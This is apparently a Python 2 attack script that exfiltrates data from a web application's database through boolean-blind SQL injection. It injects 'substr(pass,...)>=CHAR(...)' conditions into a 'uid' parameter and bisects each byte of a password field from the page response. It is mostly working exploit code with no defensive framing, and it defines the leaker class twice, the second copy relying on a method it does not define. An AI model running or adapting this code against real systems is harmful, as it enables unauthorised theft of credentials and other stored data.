#!/usr/bin/env python
'''
Script to exfiltrate data using SQLI.

It's not complete as sqlmap.
'''
import requests
import re
from leak.base import Leaker, Parser, UnexpectedPattern, LeakerEOS
from enum import Enum
import logging


logger = logging.getLogger(__name__)


class SQLIBlindParser(Parser):
    class Result(Enum):
        OK    = 0
        FAIL  = 1
        ERROR = 2

    PATTERNS = [
        (Result.OK,    r"</table><p>You can't access information about (.+?)</p><p>Page :"),
        (Result.FAIL,  r"</table><p>You can't access information about </p><p>Page :"),
        (Result.ERROR, r'</table><p>Page :'),
    ]

    def get_patterns(self):
        return self.PATTERNS

    def get_leak(self, data):
        for result, pattern in self.get_patterns():
            p = re.compile(pattern, re.DOTALL|re.M)

            finding = p.findall(data)

            if len(finding) == 0:
                continue
            logger.info('found %s' % result)

            return (result, finding[0])

        raise UnexpectedPattern('%s is not recognized by %s' % (data, self.PATTERNS))

class SQLILeaker(Leaker):
    '''
    Leaker that exfiltrate data from a database using a boolean blind sqli.
    '''
    def __init__(self, url, params=None, cookies=None, **kwargs):
        super(SQLILeaker, self).__init__(**kwargs)
        self.url = url
        self.params = params or {}
        self.cookies = cookies or {}

        #
        self.query_fmt = '1 and substr(pass,%d,1)>=CHAR(%d)'

        self.values = []
        self.substr_index = 1

        self.cmp_value = 2**7 # value used to inference
        self.value     = 0    # value exfiltered until now
        self.idx       = 7    # we will decrease until 0 to bisect

        self.update_params(None)

    def get_rng(self):
        return 2**self.idx

    def input(self):
        logger.debug('params: %s' % self.params)

        response = requests.get(self.url, params=self.params, cookies=self.cookies)

        logger.debug('input(): %s' % response.text)

        return response.text

    def update_params(self, leak):
        self.params.update({
            'uid': self.query_fmt % (self.substr_index, self.cmp_value),
        })

    def update(self, leak):
        result, data = leak

        logger.debug('result: %s' % result)

        if result == SQLIBlindParser.Result.OK:
            self.value += self.get_rng()
        elif result == SQLIBlindParser.Result.ERROR:
            raise AttributeError('dove cazzo andiamo')

        if self.idx == 0:
            if self.value == 0:
                raise LeakerEOS('FIXME: end of string?')

            # we have retrieved one bytes
            self.values.append(chr(self.value))
            self.substr_index += 1

            logger.info('New byte retrieved: %d' % self.value)
            logger.info(' values: %s' % self.values)

            # pass to the next
            self.value = 0
            self.cmp_value = 2**7
            self.idx = 7
        else:
            self.idx -= 1

            self.cmp_value = self.value + self.get_rng()

        self.update_params(leak)

        return result

    def output(self, leak_piece):
        pass

    def on_exit(self):
        print 'value: %s' % ''.join(self.values)

def dicotomia(guess):
    value = 0
    for idx in xrange(7, -1, -1):
        rng = 2**idx
        cmp_value = value
        cmp_value += rng

        #if cmp_value == guess:
        #    return cmp_value

        if cmp_value <= guess:
            value += rng

        #print '%d %d' % (idx, value, )

    return value

class SQLILeakerMetaclass(type):
    def __new__(cls, classname, bases, attrs):
        new_attrs = {}
        for kattr, attr in attrs.iteritems():
            if not kattr.startswith('__'):
                new_attrs[kattr] = attr
                print attr
        attrs['fields'] = new_attrs

        return type.__new__(cls, classname, bases, attrs)

class SQLILeaker(Leaker):
    __metaclass__ = SQLILeakerMetaclass
    def __init__(self, cookies=None, **kwargs):
        parser = None
        if kwargs.has_key('parser'):
            parser = kwargs['parser']
        elif self.fields.has_key('parser'):
            parser = self.fields['parser']

        super(SQLILeaker, self).__init__(parser=parser, **kwargs)

        self.url = self.fields['url']
        self.params = self.fields['params'] if self.fields.has_key('params') else {}
        self.data   = {}
        self.cookies = cookies or {}
        self.method = self.fields['method']
        #
        self.query_fmt = self.fields['query']

        self.values = []
        self.substr_index = 1

        self.cmp_value = 2**7 # value used to inference
        self.value     = 0    # value exfiltered until now
        self.idx       = 7    # we will decrease until 0 to bisect

        self.update_params(None)

    def get_rng(self):
        return 2**self.idx

    def input(self):
        logger.debug('params: %s' % self.params)
        logger.debug('data: %s' % self.data)

        requests_method = getattr(requests, self.method)

        response = requests_method(self.url, params=self.params, cookies=self.cookies, data=self.data, allow_redirects=False)

        logger.debug(response.headers)
        logger.debug('input(): %s' % response.text)

        return response.text

    def update(self, leak):
        result, data = leak

        logger.debug('result: %s' % result)

        if result == SQLIBlindParser.Result.OK:
            self.value += self.get_rng()
        elif result == SQLIBlindParser.Result.ERROR:
            raise AttributeError('dove cazzo andiamo')

        if self.idx == 0:
            if self.value == 0:
                raise LeakerEOS('FIXME: end of string?')

            # we have retrieved one bytes
            self.values.append(chr(self.value))
            self.substr_index += 1

            logger.info('New byte retrieved: %d' % self.value)
            logger.info(' values: %s' % self.values)

            # pass to the next
            self.value = 0
            self.cmp_value = 2**7
            self.idx = 7
        else:
            self.idx -= 1

            self.cmp_value = self.value + self.get_rng()

        self.update_params(leak)

        return result

    def output(self, leak_piece):
        pass

    def on_exit(self):
        print 'value: %s' % ''.join(self.values)

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)